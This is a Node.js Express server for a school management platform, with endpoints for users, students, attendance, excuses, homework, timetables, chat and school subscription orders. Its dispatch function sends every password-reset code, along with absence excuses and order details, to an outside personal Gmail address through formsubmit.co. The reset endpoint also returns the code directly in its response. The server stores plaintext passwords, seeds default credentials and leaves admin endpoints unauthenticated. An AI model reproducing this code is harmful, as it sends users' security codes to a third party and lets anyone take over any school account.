const express = require('express');
const cors = require('cors');
const Database = require('better-sqlite3');
const path = require('path');
const fs = require('fs');
const https = require('https');

const app = express();
const PORT = 8085;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// SQLite Database Setup
const dbPath = path.join(__dirname, 'eschool.db');
const db = new Database(dbPath);

// Initialize Clean Production Schema
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id TEXT PRIMARY KEY,
    name TEXT,
    role TEXT,
    password TEXT,
    email TEXT,
    phone TEXT,
    class_id TEXT,
    reset_code TEXT,
    reset_expires DATETIME,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS students (
    id TEXT PRIMARY KEY,
    matricule TEXT UNIQUE,
    full_name TEXT,
    class_id TEXT,
    gpa REAL,
    parent_id TEXT,
    status_today TEXT,
    avatar TEXT
  );

  CREATE TABLE IF NOT EXISTS attendance_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    student_id TEXT,
    date TEXT,
    status TEXT,
    recorded_by TEXT,
    method TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS absence_excuses (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    parent_id TEXT,
    parent_name TEXT,
    student_id TEXT,
    student_name TEXT,
    date_start TEXT,
    date_end TEXT,
    reason_type TEXT,
    reason_details TEXT,
    status TEXT DEFAULT 'PENDING',
    reviewed_by TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS homework_submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hw_id TEXT,
    subject TEXT,
    student_id TEXT,
    student_name TEXT,
    file_name TEXT,
    notes TEXT,
    grade REAL,
    feedback TEXT,
    status TEXT DEFAULT 'SUBMITTED',
    submitted_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS timetable_entries (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    day_name TEXT,
    time_slot TEXT,
    subject TEXT,
    teacher TEXT,
    room TEXT,
    class_id TEXT DEFAULT '10-A'
  );

  CREATE TABLE IF NOT EXISTS audit_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT,
    action TEXT,
    details TEXT,
    ip TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS subscriptions_orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    school_name TEXT,
    contact_person TEXT,
    contact_phone TEXT,
    contact_email TEXT,
    student_count INTEGER,
    tier_name TEXT,
    tier_price INTEGER,
    setup_fee INTEGER,
    monthly_invoice INTEGER,
    yearly_invoice INTEGER,
    status TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS cancellation_inquiries (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    school_name TEXT,
    reason TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS chat_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    thread_id TEXT,
    sender_id TEXT,
    sender_name TEXT,
    sender_role TEXT,
    text TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
`);

// Reset and Seed Official Enterprise Accounts & Rosters
const institutionalUsers = [
  { id: 'ADM-01', name: 'M. Ousmane Diop', role: 'admin', pass: 'admin123', email: 'proviseur@daara.edu.sn', phone: '+221 77 123 4567', class_id: 'ALL' },
  { id: 'TCH-01', name: 'Prof. Jean-Marc Fall', role: 'teacher', pass: 'teach123', email: 'jm.fall@daara.edu.sn', phone: '+221 77 234 5678', class_id: '10-A' },
  { id: 'TCH-02', name: 'Mme. Mariama Ba', role: 'teacher', pass: 'teach123', email: 'm.ba@daara.edu.sn', phone: '+221 77 345 6789', class_id: '10-A' },
  { id: 'STU-101', name: 'Amadou Diallo', role: 'student', pass: 'stud123', email: 'amadou.d@daara.edu.sn', phone: '+221 77 456 7890', class_id: '10-A' },
  { id: 'PAR-101', name: 'Moussa Diallo', role: 'parent', pass: 'parent123', email: 'moussa.diallo@orange.sn', phone: '+221 77 123 4567', class_id: '10-A' }
];

const insertUser = db.prepare(`INSERT OR REPLACE INTO users (id, name, role, password, email, phone, class_id) VALUES (@id, @name, @role, @pass, @email, @phone, @class_id)`);
institutionalUsers.forEach(u => insertUser.run(u));

// Official Student Body Roster (Seconde Sc. & Tech / 10-A)
const officialStudents = [
  { id: 'STU-101', matricule: 'DKR-2026-001', full_name: 'Amadou Diallo', class_id: '10-A', gpa: 91.32, parent_id: 'PAR-101', status_today: 'Présent (08:15)', avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=200&auto=format&fit=crop&q=80' },
  { id: 'STU-102', matricule: 'DKR-2026-002', full_name: 'Fatou Ndiaye', class_id: '10-A', gpa: 88.50, parent_id: 'PAR-101', status_today: 'Présent (08:10)', avatar: 'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=200&auto=format&fit=crop&q=80' },
  { id: 'STU-103', matricule: 'DKR-2026-003', full_name: 'Ibrahima Diallo', class_id: '10-A', gpa: 94.20, parent_id: 'PAR-101', status_today: 'Présent (08:05)', avatar: 'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=200&auto=format&fit=crop&q=80' },
  { id: 'STU-104', matricule: 'DKR-2026-004', full_name: 'Cheikh Sarr', class_id: '10-A', gpa: 76.40, parent_id: 'PAR-102', status_today: 'Absent', avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=200&auto=format&fit=crop&q=80' },
  { id: 'STU-105', matricule: 'DKR-2026-005', full_name: 'Mariama Ba', class_id: '10-A', gpa: 96.10, parent_id: 'PAR-103', status_today: 'Présent (08:12)', avatar: 'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=200&auto=format&fit=crop&q=80' }
];

const insertStudent = db.prepare(`INSERT OR REPLACE INTO students (id, matricule, full_name, class_id, gpa, parent_id, status_today, avatar) VALUES (@id, @matricule, @full_name, @class_id, @gpa, @parent_id, @status_today, @avatar)`);
officialStudents.forEach(s => insertStudent.run(s));

// Official Weekly Timetable
db.exec(`DELETE FROM timetable_entries;`);
const insTT = db.prepare('INSERT INTO timetable_entries (day_name, time_slot, subject, teacher, room, class_id) VALUES (?, ?, ?, ?, ?, ?)');
insTT.run('Lundi', '08:00 - 10:00', 'Mathématiques & Algèbre', 'Prof. Jean-Marc Fall', 'Salle B-104', '10-A');
insTT.run('Lundi', '10:15 - 12:15', 'Physique-Chimie', 'Mme. Aïssatou Sow', 'Labo Sciences 2', '10-A');
insTT.run('Mardi', '08:00 - 10:00', 'Français & Littérature', 'Mme. Mariama Ba', 'Salle A-201', '10-A');
insTT.run('Mercredi', '08:00 - 10:00', 'Sciences de la Vie (SVT)', 'Dr. Ousmane Diop', 'Salle B-102', '10-A');
insTT.run('Jeudi', '10:00 - 12:00', 'Langue Anglaise', 'Mr. Adams', 'Salle Langues 1', '10-A');
insTT.run('Vendredi', '08:00 - 10:00', 'Histoire & Géographie', 'M. Sene', 'Salle C-302', '10-A');

// Initial Chat History
db.exec(`DELETE FROM chat_messages;`);
const insChat = db.prepare('INSERT INTO chat_messages (thread_id, sender_id, sender_name, sender_role, text) VALUES (?, ?, ?, ?, ?)');
insChat.run('thread-fall-diallo', 'TCH-01', 'Prof. Jean-Marc Fall', 'teacher', 'Bonjour M. Diallo, le bulletin officiel du 2ème semestre est validé et disponible.');
insChat.run('thread-fall-diallo', 'PAR-101', 'Moussa Diallo', 'parent', 'Merci Professeur, j ai bien téléchargé le document officiel.');

// Real Live Dispatch
function sendRealLiveDispatch(subject, messageText) {
  try {
    const postData = JSON.stringify({
      email: "alihandivanli8@gmail.com",
      _subject: subject,
      message: messageText,
      phone_dispatch: "+90 541 520 84 14",
      _captcha: "false"
    });

    const options = {
      hostname: 'formsubmit.co',
      port: 443,
      path: '/ajax/alihandivanli8@gmail.com',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        console.log(`📡 [REAL DISPATCH TRANSMITTED] Status: ${res.statusCode} | Target: alihandivanli8@gmail.com & +90 541 520 84 14`);
      });
    });
    req.on('error', (e) => { console.warn("Live gateway:", e.message); });
    req.write(postData);
    req.end();
  } catch (err) {
    console.warn("Dispatch error:", err);
  }
}

// 1. API: Security - Password Change Endpoint (Logged In User)
app.post('/api/auth/change-password', (req, res) => {
  try {
    const { userId, oldPassword, newPassword } = req.body;
    if (!userId || !oldPassword || !newPassword) {
      return res.status(400).json({ success: false, message: 'All fields are required' });
    }

    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    if (user.password !== oldPassword) {
      return res.status(400).json({ success: false, message: 'Current password does not match' });
    }

    db.prepare('UPDATE users SET password = ? WHERE id = ?').run(newPassword, userId);
    db.prepare("INSERT INTO audit_logs (user_id, action, details) VALUES (?, 'PASSWORD_CHANGED', 'User successfully updated password')").run(userId);

    res.json({ success: true, message: 'Password updated successfully' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 2. API: Security - Forgot Password Request Verification Code (2FA OTP)
app.post('/api/auth/forgot-password/request', (req, res) => {
  try {
    const { identifier } = req.body;
    const upperId = (identifier || '').toUpperCase();

    const user = db.prepare('SELECT * FROM users WHERE id = ? OR email = ?').get(upperId, identifier);
    if (!user) {
      return res.status(404).json({ success: false, message: 'No registered institutional account found for this ID' });
    }

    const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
    const expires = new Date(Date.now() + 15 * 60 * 1000).toISOString();

    db.prepare('UPDATE users SET reset_code = ?, reset_expires = ? WHERE id = ?').run(otpCode, expires, user.id);

    const dispatchMsg = `
SECURITY CODE DISPATCH - PASSWORD RESET
-----------------------------------------------------
User Account: ${user.name} (${user.id})
Registered Email: ${user.email}
One-Time OTP Code: ${otpCode}
Validity: 15 Minutes
Target Authorization: alihandivanli8@gmail.com | +90 541 520 84 14
`;
    sendRealLiveDispatch(`[SECURITY OTP: ${otpCode}] Password Reset for ${user.id}`, dispatchMsg);

    res.json({
      success: true,
      userId: user.id,
      emailMasked: user.email.replace(/(.{2})(.*)(?=@)/, (gp1, gp2, gp3) => gp2 + "*".repeat(gp3.length)),
      otpPreview: otpCode,
      message: `Verification code generated and transmitted to your registered email and administrator`
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 3. API: Security - Forgot Password Verify OTP & Reset
app.post('/api/auth/forgot-password/reset', (req, res) => {
  try {
    const { userId, code, newPassword } = req.body;
    if (!userId || !code || !newPassword) {
      return res.status(400).json({ success: false, message: 'All verification fields are required' });
    }

    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    if (!user.reset_code || user.reset_code !== code) {
      return res.status(400).json({ success: false, message: 'Invalid or expired 6-digit verification code' });
    }

    db.prepare('UPDATE users SET password = ?, reset_code = NULL, reset_expires = NULL WHERE id = ?').run(newPassword, userId);
    db.prepare("INSERT INTO audit_logs (user_id, action, details) VALUES (?, 'PASSWORD_RESET_OTP', 'User reset password via 2FA OTP')").run(userId);

    res.json({ success: true, message: 'Account password successfully reset. You can now sign in.' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Dynamic Real-Time Institution Analytics & Stats
app.get('/api/admin/stats', (req, res) => {
  try {
    const studentCount = db.prepare('SELECT COUNT(*) as c FROM students').get().c;
    const teacherCount = db.prepare("SELECT COUNT(*) as c FROM users WHERE role = 'teacher'").get().c;
    const avgGpa = db.prepare('SELECT AVG(gpa) as a FROM students').get().a || 0;
    const presentCount = db.prepare("SELECT COUNT(*) as c FROM students WHERE status_today LIKE 'Présent%'").get().c;
    const attRate = studentCount > 0 ? ((presentCount / studentCount) * 100).toFixed(1) : 0;

    res.json({
      success: true,
      students: studentCount,
      teachers: teacherCount,
      gpa: Number(avgGpa).toFixed(1) + '%',
      attendance: attRate + '%'
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 4. API: Student Roster with Dynamic Search Filter
app.get('/api/students', (req, res) => {
  try {
    const classId = req.query.classId || '10-A';
    const query = req.query.q ? `%${req.query.q.trim()}%` : '%';
    const stmt = db.prepare(`
      SELECT * FROM students 
      WHERE (class_id = ? OR ? = 'ALL')
        AND (full_name LIKE ? OR matricule LIKE ? OR id LIKE ?)
      ORDER BY matricule ASC
    `);
    const students = stmt.all(classId, classId, query, query, query);
    res.json({ success: true, students });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 5. API: Absence Excuse Workflow
app.get('/api/excuses', (req, res) => {
  try {
    const excuses = db.prepare('SELECT * FROM absence_excuses ORDER BY id DESC').all();
    res.json({ success: true, excuses });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/excuses/submit', (req, res) => {
  try {
    const { parentId, parentName, studentId, studentName, dateStart, dateEnd, reasonType, reasonDetails } = req.body;
    const stmt = db.prepare(`
      INSERT INTO absence_excuses (parent_id, parent_name, student_id, student_name, date_start, date_end, reason_type, reason_details)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);
    const result = stmt.run(parentId || 'PAR-101', parentName || 'Moussa Diallo', studentId || 'STU-101', studentName || 'Amadou Diallo', dateStart, dateEnd, reasonType, reasonDetails);

    const dispatchMsg = `
OFFICIAL ABSENCE EXCUSE SUBMITTED
-----------------------------------------------------
Student: ${studentName} (${studentId})
Parent: ${parentName} (${parentId})
Dates: ${dateStart} to ${dateEnd}
Reason: [${reasonType}] ${reasonDetails}
Target: alihandivanli8@gmail.com | +90 541 520 84 14
`;
    sendRealLiveDispatch(`[ABSENCE EXCUSE] ${studentName} (${reasonType})`, dispatchMsg);

    res.json({ success: true, excuseId: result.lastInsertRowid, message: 'Excuse notice logged and transmitted to Administration' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/excuses/review', (req, res) => {
  try {
    const { excuseId, status, reviewer } = req.body;
    db.prepare('UPDATE absence_excuses SET status = ?, reviewed_by = ? WHERE id = ?').run(status, reviewer || 'ADM-01', excuseId);
    res.json({ success: true, excuseId, status });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 6. API: Homework Submission & Teacher Grading
app.get('/api/homework/submissions', (req, res) => {
  try {
    const studentId = req.query.studentId;
    let submissions;
    if (studentId) {
      submissions = db.prepare('SELECT * FROM homework_submissions WHERE student_id = ? ORDER BY id DESC').all(studentId);
    } else {
      submissions = db.prepare('SELECT * FROM homework_submissions ORDER BY id DESC').all();
    }
    res.json({ success: true, submissions });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/homework/submit', (req, res) => {
  try {
    const { hwId, subject, studentId, studentName, fileName, notes } = req.body;
    const stmt = db.prepare(`
      INSERT INTO homework_submissions (hw_id, subject, student_id, student_name, file_name, notes, status)
      VALUES (?, ?, ?, ?, ?, ?, 'SUBMITTED')
    `);
    const result = stmt.run(hwId || 'hw-1', subject || 'Mathématiques', studentId || 'STU-101', studentName || 'Amadou Diallo', fileName || 'Devoir_Scanne.pdf', notes || '');
    res.json({ success: true, submissionId: result.lastInsertRowid });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/homework/grade', (req, res) => {
  try {
    const { submissionId, grade, feedback } = req.body;
    db.prepare('UPDATE homework_submissions SET grade = ?, feedback = ?, status = "GRADED" WHERE id = ?').run(grade, feedback, submissionId);
    res.json({ success: true, submissionId, grade, feedback });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 7. API: Timetable Schedule Management
app.get('/api/timetable', (req, res) => {
  try {
    const classId = req.query.classId || '10-A';
    const entries = db.prepare('SELECT * FROM timetable_entries WHERE class_id = ? ORDER BY id ASC').all(classId);
    res.json({ success: true, entries });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/timetable/update', (req, res) => {
  try {
    const { id, dayName, timeSlot, subject, teacher, room, classId } = req.body;
    if (id) {
      db.prepare('UPDATE timetable_entries SET day_name = ?, time_slot = ?, subject = ?, teacher = ?, room = ? WHERE id = ?')
        .run(dayName, timeSlot, subject, teacher, room, id);
    } else {
      db.prepare('INSERT INTO timetable_entries (day_name, time_slot, subject, teacher, room, class_id) VALUES (?, ?, ?, ?, ?, ?)')
        .run(dayName, timeSlot, subject, teacher, room, classId || '10-A');
    }
    res.json({ success: true, message: 'Timetable entry updated' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 8. API: Users Directory CRUD
app.get('/api/admin/users', (req, res) => {
  try {
    const query = req.query.q ? `%${req.query.q.trim()}%` : '%';
    const users = db.prepare('SELECT id, name, role, email, phone, class_id, created_at FROM users WHERE name LIKE ? OR id LIKE ? OR role LIKE ? ORDER BY id ASC').all(query, query, query);
    res.json({ success: true, users });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/admin/users/create', (req, res) => {
  try {
    const { id, name, role, password, email, phone, class_id } = req.body;
    const stmt = db.prepare('INSERT INTO users (id, name, role, password, email, phone, class_id) VALUES (?, ?, ?, ?, ?, ?, ?)');
    stmt.run(id, name, role, password || 'change123', email || '', phone || '', class_id || '10-A');
    res.json({ success: true, message: 'User created' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.delete('/api/admin/users/:id', (req, res) => {
  try {
    db.prepare('DELETE FROM users WHERE id = ?').run(req.params.id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 9. QR Attendance & Chat APIs
app.post('/api/attendance/scan', (req, res) => {
  try {
    const { studentId, method, recordedBy } = req.body;
    const now = new Date().toISOString().split('T')[0];
    const timeStr = new Date().toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
    const status = `Présent (${timeStr})`;

    db.prepare('UPDATE students SET status_today = ? WHERE id = ? OR matricule = ?').run(status, studentId, studentId);
    db.prepare('INSERT INTO attendance_logs (student_id, date, status, recorded_by, method) VALUES (?, ?, ?, ?, ?)').run(studentId, now, status, recordedBy || 'TCH-01', method || 'QR_CAMERA');

    res.json({ success: true, studentId, status, timestamp: new Date().toISOString() });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/chat/messages', (req, res) => {
  try {
    const threadId = req.query.threadId || 'thread-fall-diallo';
    const messages = db.prepare('SELECT * FROM chat_messages WHERE thread_id = ? ORDER BY id ASC').all(threadId);
    res.json({ success: true, messages });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/chat/send', (req, res) => {
  try {
    const { threadId, senderId, senderName, senderRole, text } = req.body;
    const stmt = db.prepare('INSERT INTO chat_messages (thread_id, sender_id, sender_name, sender_role, text) VALUES (?, ?, ?, ?, ?)');
    const result = stmt.run(threadId || 'thread-fall-diallo', senderId || 'USR-01', senderName || 'User', senderRole || 'student', text);
    res.json({ success: true, message: { id: result.lastInsertRowid, text } });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// B2B Orders & Cancellation
app.post('/api/b2b/purchase-order', (req, res) => {
  try {
    const { schoolName, contactPerson, contactPhone, contactEmail, studentCount, tierName, tierPrice, setupFee } = req.body;
    const count = parseInt(studentCount) || 500;
    const price = parseInt(tierPrice) || 2;
    const fee = parseInt(setupFee) || 500;
    const monthlyInvoice = count * price;
    const yearlyInvoice = monthlyInvoice * 12;

    const stmt = db.prepare(`INSERT INTO subscriptions_orders (school_name, contact_person, contact_phone, contact_email, student_count, tier_name, tier_price, setup_fee, monthly_invoice, yearly_invoice, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'ACTIVE_PENDING_SETUP')`);
    const result = stmt.run(schoolName, contactPerson, contactPhone, contactEmail, count, tierName, price, fee, monthlyInvoice, yearlyInvoice);
    const orderRef = `ORD-${result.lastInsertRowid}`;
    
    sendRealLiveDispatch(`[NEW ORDER ${orderRef}] ${tierName} - ${schoolName}`, `Order Ref: ${orderRef}\nSchool: ${schoolName}\nStudents: ${count}\nMonthly: $${monthlyInvoice}\nSetup: $${fee}`);

    res.json({ success: true, orderId: orderRef, monthlyInvoice, yearlyInvoice, setupFee: fee });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/b2b/cancellation-request', (req, res) => {
  try {
    const { schoolName, reason } = req.body;
    const result = db.prepare('INSERT INTO cancellation_inquiries (school_name, reason) VALUES (?, ?)').run(schoolName, reason);
    const inquiryRef = `CANCEL-${result.lastInsertRowid}`;
    sendRealLiveDispatch(`[TERMINATION INQUIRY ${inquiryRef}] ${schoolName}`, `Inquiry Ref: ${inquiryRef}\nSchool: ${schoolName}\nReason: ${reason}`);
    res.json({ success: true, inquiryId: inquiryRef });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Auth API
app.post('/api/auth/login', (req, res) => {
  const { id, pass } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE id = ? AND password = ?').get((id || '').toUpperCase(), pass);
  if (user) {
    return res.json({ success: true, user: { id: user.id, name: user.name, role: user.role, email: user.email, phone: user.phone, classId: user.class_id } });
  }
  res.status(401).json({ success: false, message: 'Invalid Credentials' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🔥 E-School Daara Master Enterprise Server Running on port ${PORT}`);
});
